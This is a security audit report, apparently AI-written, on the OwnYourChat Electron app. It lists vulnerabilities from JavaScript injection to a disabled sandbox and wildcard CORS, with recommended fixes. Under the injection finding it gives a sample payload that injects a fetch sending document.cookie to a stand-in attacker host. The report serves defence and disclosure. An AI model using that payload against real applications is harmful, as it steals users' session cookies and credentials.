# Security Audit Report - OwnYourChat

**Audit Date:** 2026-02-03
**Version Audited:** 1.4.0
**Auditor:** Claude Security Analysis

---

## Executive Summary

OwnYourChat is a privacy-respecting local-first application with **no trackers, analytics, or third-party data collection**. All conversation data is stored locally. However, several security vulnerabilities were identified that should be addressed.

---

## Privacy Assessment: EXCELLENT

### No Third-Party Data Collection

- **No analytics libraries** (Google Analytics, Mixpanel, Segment, Amplitude, etc.)
- **No telemetry services** (Sentry, Bugsnag, Rollbar, Datadog, etc.)
- **No crash reporting** that sends data externally
- **No device fingerprinting**
- **No tracking pixels or beacons**

### Network Communication

The application only communicates with:

| Destination | Purpose | Data Sent |
|-------------|---------|-----------|
| `chatgpt.com/backend-api` | Sync ChatGPT conversations | Session headers only |
| `claude.ai/api` | Sync Claude conversations | Session headers only |
| `perplexity.ai/rest` | Sync Perplexity conversations | Session headers only |
| `github.com` | Check for updates | None (reads release info) |
| `localhost:37777` | MCP server (optional, local only) | Conversation queries |

### Data Storage

All data remains on the local machine:
- Conversations stored in local SQLite database
- Attachments cached in local filesystem
- Settings stored in local JSON file
- No cloud sync or backup to external servers

---

## Security Vulnerabilities

### CRITICAL

#### 1. Code Injection in JavaScript Execution

**Files:**
- `src/main/sync/providers/chatgpt-provider.ts` (lines 831-877)
- `src/main/sync/providers/claude-provider.ts` (lines 1072-1128)

**Description:**
User-controlled values (`conversationId`, `organizationId`) are interpolated directly into JavaScript template strings passed to `executeJavaScript()`.

**Example (chatgpt-provider.ts:877):**
```typescript
'https://chatgpt.com/backend-api/conversation/${conversationId}'
```

**Attack Vector:**
If an attacker can control the `conversationId` value (from API responses), they could inject arbitrary JavaScript:
```
conversationId = "abc'; fetch('http://attacker.com?data=' + document.cookie); return '"
```

**Impact:** Remote code execution in WebContentsView context with access to API credentials and session data.

**Recommendation:**
```typescript
const safeId = JSON.stringify(conversationId);
return `fetch(\`https://chatgpt.com/backend-api/conversation/\${${safeId}}\`)`;
```

---

#### 2. Disabled Electron Sandbox

**File:** `src/main/index.ts` (line 230)

**Current Configuration:**
```typescript
webPreferences: {
  preload: join(__dirname, '../preload/index.js'),
  sandbox: false  // INSECURE
}
```

**Impact:** The renderer process has unrestricted access to Node.js APIs. Combined with the code injection vulnerability, an attacker could access the filesystem, execute commands, or read the database.

**Recommendation:**
```typescript
webPreferences: {
  preload: join(__dirname, '../preload/index.js'),
  sandbox: true,
  contextIsolation: true,
  nodeIntegration: false
}
```

---

### HIGH

#### 3. Content Security Policy Bypass

**File:** `src/main/index.ts` (lines 207-217)

**Current Configuration:**
```typescript
protocol.registerSchemesAsPrivileged([{
  scheme: 'attachment',
  privileges: {
    bypassCSP: true,  // INSECURE
    // ...
  }
}])
```

**Impact:** Attachment URLs can bypass Content Security Policy, potentially enabling XSS attacks if attachment content contains malicious scripts.

**Recommendation:** Remove `bypassCSP: true` unless absolutely necessary.

---

#### 4. CORS Misconfiguration in MCP Server

**File:** `src/main/mcp/server.ts` (line 148)

**Current Configuration:**
```typescript
res.setHeader('Access-Control-Allow-Origin', '*')
```

**Impact:** While the server binds to localhost, the wildcard CORS header could allow any web page to access the MCP server if accessed via localhost.

**Recommendation:**
```typescript
res.setHeader('Access-Control-Allow-Origin', 'http://localhost:5173')
```

---

### MEDIUM

#### 5. Path Traversal in Attachment Protocol

**File:** `src/main/index.ts` (lines 270-289)

**Description:** The attachment protocol handler constructs file paths without validating against directory traversal.

**Recommendation:**
```typescript
const filePath = join(getAttachmentsPath(), conversationId, filename)
const normalizedPath = resolve(filePath)
const basePath = resolve(getAttachmentsPath())

if (!normalizedPath.startsWith(basePath)) {
  return new Response('Invalid path', { status: 400 })
}
```

---

#### 6. MCP Server Without Authentication

**File:** `src/main/mcp/server.ts`

**Description:** The MCP server exposes conversation data to any process on localhost without authentication. While it only binds to localhost, any malicious software running locally could query all conversations.

**Recommendation:** Implement token-based authentication for MCP connections.

---

#### 7. Unencrypted Database at Rest

**File:** `src/main/db/index.ts`

**Description:** The SQLite database containing all conversation history is stored without encryption. Any process with filesystem access can read the database.

**Recommendation:** Consider using SQLCipher for database encryption.

---

#### 8. DevTools Debug Handlers in Production

**File:** `src/main/ipc.ts` (lines 243-277)

**Description:** IPC handlers allow opening DevTools on provider views, which could expose session cookies and credentials.

**Recommendation:** Disable these handlers in production builds or require explicit user confirmation.

---

### LOW

#### 9. Credentials Stored in Memory

**Files:** All provider files

**Description:** API authorization headers are held in memory throughout the application lifecycle. While this is standard practice, memory dumps could expose credentials.

**Note:** Credentials are session-based and not persisted to disk, which is appropriate.

---

#### 10. Preload Script Fallback

**File:** `src/preload/index.ts` (lines 220-235)

**Description:** The preload script has a fallback for disabled context isolation that directly assigns APIs to the window object.

**Recommendation:** Remove the fallback and require context isolation.

---

## Dependency Analysis

All dependencies are legitimate open-source packages:

| Category | Packages |
|----------|----------|
| UI | react, @radix-ui/*, @phosphor-icons/react |
| Database | drizzle-orm, better-sqlite3 |
| State | zustand, @zubridge/electron |
| Build | electron-vite, electron-builder |
| Testing | vitest |

**No suspicious or proprietary tracking packages detected.**

---

## Recommendations Summary

### Immediate (CRITICAL)

1. Fix JavaScript injection vulnerabilities by properly escaping user input
2. Enable Electron sandbox (`sandbox: true`)

### Short-term (HIGH)

3. Remove `bypassCSP: true` from attachment protocol
4. Restrict CORS to specific origins
5. Disable DevTools handlers in production

### Medium-term (MEDIUM)

6. Add path traversal validation to attachment protocol
7. Consider adding authentication to MCP server
8. Consider database encryption with SQLCipher

---

## Conclusion

**Privacy:** OwnYourChat is a genuinely private, local-first application with no data collection or tracking.

**Security:** Several vulnerabilities exist that could be exploited if an attacker controls API responses or runs malicious software locally. The most critical issues are the JavaScript injection and disabled sandbox, which should be addressed promptly.

The application's security posture is appropriate for a local-first tool, but improvements to the Electron security configuration would significantly reduce the attack surface.
